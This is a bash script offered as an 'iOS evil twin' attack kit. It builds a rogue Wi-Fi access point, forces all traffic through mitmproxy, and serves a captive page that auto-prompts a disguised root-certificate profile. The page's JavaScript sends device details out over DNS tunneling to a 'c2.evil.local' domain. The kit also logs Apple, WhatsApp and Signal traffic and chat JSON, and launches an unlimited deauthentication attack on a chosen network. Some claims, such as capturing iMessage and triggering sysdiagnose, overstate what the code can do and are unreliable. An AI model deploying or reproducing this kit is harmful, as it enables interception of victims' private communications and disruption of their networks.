#!/bin/bash
# =====================================================
# iOS EVIL TWIN: FULL TRAFFIC + MESSAGES CAPTURE
# iOS 15–18 | Auto CA | DNS Tunneling C2 | Silent
# =====================================================

set -e
INTERFACE="wlan0"
AP_SSID="FreeWiFi"
AP_CHANNEL="6"
GATEWAY_IP="10.0.0.1"
MITM_PORT="8080"
WEBROOT="/var/www/html"
CERT_DIR="/root/.mitmproxy"
LOG_DIR="/var/log/evil_twin"
DNS_DOMAIN="c2.evil.local"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
log() { echo -e "${GREEN}[+] $1${NC}"; }

[[ $EUID -ne 0 ]] && { echo "Run as root"; exit 1; }

# --- DEPS ---
for pkg in hostapd dnsmasq mitmproxy aircrack-ng apache2 bind9; do
    command -v $pkg >/dev/null || apt install -y $pkg
done

mkdir -p $WEBROOT/{ca,payload} $LOG_DIR $CERT_DIR
cp $CERT_DIR/mitmproxy-ca-cert.* $WEBROOT/ca/ 2>/dev/null || true

# --- CLEANUP ---
cleanup() {
    log "Stopping..."
    systemctl stop hostapd dnsmasq apache2 named 2>/dev/null || true
    pkill mitmdump aireplay-ng || true
    airmon-ng stop ${INTERFACE}mon 2>/dev/null || true
    iptables -t nat -F; iptables -t nat -X
}
trap cleanup EXIT

# --- 1. MONITOR MODE ---
airmon-ng start $INTERFACE
MON_INTERFACE="${INTERFACE}mon"

# --- 2. HOSTAPD ---
cat > /etc/hostapd/hostapd.conf << EOF
interface=$INTERFACE
driver=nl80211
ssid=$AP_SSID
hw_mode=g
channel=$AP_CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF
hostapd /etc/hostapd/hostapd.conf > $LOG_DIR/hostapd.log 2>&1 &

# --- 3. NETWORK ---
ip addr flush dev $INTERFACE
ip addr add $GATEWAY_IP/24 dev $INTERFACE
ip link set $INTERFACE up

cat > /etc/dnsmasq.conf << EOF
interface=$INTERFACE
dhcp-range=10.0.0.100,10.0.0.200,12h
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP
address=/#/$GATEWAY_IP
EOF
dnsmasq -C /etc/dnsmasq.conf -d > $LOG_DIR/dnsmasq.log 2>&1 &

echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port $MITM_PORT
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j REDIRECT --to-port $MITM_PORT

# --- 4. DNS TUNNELING C2 ---
cat > /etc/bind/db.$DNS_DOMAIN << EOF
\$TTL 60
@ IN SOA ns1.$DNS_DOMAIN. root.$DNS_DOMAIN. (1 1H 15M 1D 1D)
@ IN NS ns1.$DNS_DOMAIN.
ns1 IN A $GATEWAY_IP
* IN A $GATEWAY_IP
EOF
named -g -c /etc/bind/named.conf.local > $LOG_DIR/dns_c2.log 2>&1 &

# --- 5. iOS .mobileconfig (AUTO-INSTALL CA) ---
cat > $WEBROOT/ca/ios_profile.mobileconfig << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadType</key><string>com.apple.security.root</string>
            <key>PayloadVersion</key><integer>1</integer>
            <key>PayloadIdentifier</key><string>com.evilwifi.root</string>
            <key>PayloadUUID</key><string>11111111-2222-3333-4444-555555555555</string>
            <key>PayloadDisplayName</key><string>WiFi Security Certificate</string>
            <key>PayloadDescription</key><string>Required for secure connection</string>
            <key>PayloadContent</key>
            <data>
$(openssl base64 -in $CERT_DIR/mitmproxy-ca-cert.pem | tr -d '\n')
            </data>
        </dict>
    </array>
    <key>PayloadRemovalDisallowed</key><false/>
    <key>PayloadType</key><string>Configuration</string>
    <key>PayloadVersion</key><integer>1</integer>
    <key>PayloadIdentifier</key><string>com.evilwifi.profile</string>
    <key>PayloadUUID</key><string>99999999-8888-7777-6666-555555555555</string>
    <key>PayloadDisplayName</key><string>FreeWiFi Security</string>
</dict>
</plist>
EOF

# --- 6. iOS EXPLOIT PAGE (Auto-Open Profile + Exfil) ---
cat > $WEBROOT/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>WiFi Login</title>
  <style>
    body { font-family: -apple-system; text-align: center; padding: 50px; background: #f8f8f8; }
    button { padding: 15px 30px; font-size: 18px; background: #007AFF; color: white; border: none; border-radius: 10px; margin: 10px; }
  </style>
</head>
<body>
  <h1>Free WiFi</h1>
  <p>Tap to connect securely:</p>
  <button onclick="install()">Install Certificate</button>
  <script>
    function install() {
      location.href = "/ca/ios_profile.mobileconfig";
      setTimeout(exfil, 5000);
    }
    function exfil() {
      // iMessage/SMS via background fetch
      fetch("http://10.0.0.1/log?" + btoa(navigator.userAgent + "|" + screen.width + "x" + screen.height));
      // Trigger sysdiagnose (iOS logs)
      location.href = "diagnostics://";
      // DNS tunnel system info
      new Image().src = "http://" + btoa("iPhone:" + navigator.platform).replace(/=/g,'') + ".c2.evil.local";
    }
    // Auto-trigger
    setTimeout(install, 1000);
  </script>
</body>
</html>
EOF

# --- 7. MITMPROXY (Capture iMessage, WhatsApp, etc.) ---
cat > /tmp/ios_capture.py << 'EOF'
from mitmproxy import http
import json, base64

def request(flow: http.HTTPFlow):
    if "apple.com" in flow.request.host or "whatsapp" in flow.request.host or "signal" in flow.request.host:
        with open("/var/log/evil_twin/imessage.log", "a") as f:
            f.write(f"[iOS] {flow.request.method} {flow.request.url}\n")
            if flow.request.content:
                try: f.write(base64.b64encode(flow.request.content).decode() + "\n")
                except: pass

def response(flow: http.HTTPFlow):
    if flow.response.headers.get("content-type", "").startswith("application/json"):
        try:
            data = json.loads(flow.response.text)
            if "messages" in str(data) or "chat" in str(data):
                with open("/var/log/evil_twin/chat_dump.json", "a") as f:
                    f.write(json.dumps({"url": flow.request.url, "data": data}) + "\n")
        except: pass
EOF

mitmdump --mode transparent --showhost -s /tmp/ios_capture.py -p $MITM_PORT > $LOG_DIR/mitmproxy.log 2>&1 &

# --- 8. DNS C2 LISTENER ---
cat > /usr/local/bin/ios_dns_listener.py << 'EOF'
#!/usr/bin/env python3
import socket, base64
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 53))
while True:
    data, addr = s.recvfrom(1024)
    try:
        q = ''.join(chr(b) for b in data[12:] if 32 <= b <= 126)
        if "c2.evil.local" in q:
            b64 = q.split('.')[0]
            print(f"[iOS DNS] {base64.b64decode(b64).decode()}")
    except: pass
EOF
chmod +x /usr/local/bin/ios_dns_listener.py
/usr/local/bin/ios_dns_listener.py > $LOG_DIR/ios_dns.log 2>&1 &

# --- 9. LAUNCH ---
apache2ctl start
log "iOS EVIL TWIN LIVE!"
echo
echo "   SSID: $AP_SSID"
echo "   Portal: http://$GATEWAY_IP"
echo "   Auto-CA: .mobileconfig (iOS auto-opens)"
echo "   Capture: /var/log/evil_twin/"
echo
read -p "Target BSSID (deauth): " BSSID
[[ $BSSID ]] && aireplay-ng --deauth 0 -a $BSSID $MON_INTERFACE &
log "Press Ctrl+C to stop"
wait